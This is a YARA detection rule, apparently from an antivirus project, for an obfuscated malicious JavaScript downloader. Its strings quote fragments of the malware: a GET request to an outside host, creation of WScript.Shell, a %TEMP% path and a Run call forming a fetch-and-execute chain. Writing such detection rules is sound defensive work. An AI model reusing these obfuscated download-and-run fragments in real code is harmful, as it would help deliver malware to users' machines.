rule sig_20160427_d4d0cfc347fc25b0b264486d30d64bb5 {
  meta:
    description = "datamaliciousorder - file 20160427_d4d0cfc347fc25b0b264486d30d64bb5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1b3b52f8e271365947f287be172ef69f73af452fdc8c4bb687b2aab27469f6f9"

  strings:
    $s1  = "JjyxpWbmno[ApqjpGyjlz](\"G\" + \"ET\", \"http://l-dsk.com/k3isfa\", false);" fullword ascii
    $s2  = "function HxhhyCduac() {return QylvoYkbko[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"hgGml7u" ascii
    $s3  = "function HxhhyCduac() {return QylvoYkbko[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"hgGml7u" ascii
    $s4  = "var QylvoYkbko = function FzcczExyls() {return NxwxeLbhkv[QfkfgXgnea](\"WScript\"+\".Shell\");}(), ZazciQakhg = 11;" fullword ascii
    $s5  = "function DydmcYjtdc(HnaziLgnkk, FjqwbHvhcl){OsnbsOyisw = OsnbsOyisw * 1; return HnaziLgnkk - FjqwbHvhcl;};" fullword ascii
    $s6  = "var NxwxeLbhkv = this[\"WScript\"];" fullword ascii
    $s7  = "if (JjyxpWbmno[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function RyyzbRixwc(){return CcrvfEoeid + \"\";};" fullword ascii
    $s9  = "function DuikoGtleo() {return ((ZovttVyxlb == true) && (ZovttVyxlb == YvgkiFdgsd)) ? 1 : OsnbsOyisw;};" fullword ascii
    $s10 = "SwfboMgvsy = true;" fullword ascii
    $s11 = "YvgkiFdgsd = true; " fullword ascii
    $s12 = "var YvgkiFdgsd = false;" fullword ascii
    $s13 = "function WdpwnQacfi(PxhpuAwhcz) {var ChfvxXlahh = (1, 2, 3, 4, 5, PxhpuAwhcz); return ChfvxXlahh;};" fullword ascii
    $s14 = "ZovttVyxlb = true; " fullword ascii
    $s15 = "var SwfboMgvsy = false;" fullword ascii
    $s16 = "}while (BmxkaQyyqv);" fullword ascii
    $s17 = "function FaruqCkljn()" fullword ascii
    $s18 = "var ZovttVyxlb = false;" fullword ascii
    $s19 = "function RflveHyqzq(){return QfkfgXgnea;};" fullword ascii
    $s20 = "function VhmatWzlgb(TubjoUvplg){QylvoYkbko[\"R\"+\"un\"](TubjoUvplg, OsnbsOyisw, OsnbsOyisw);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}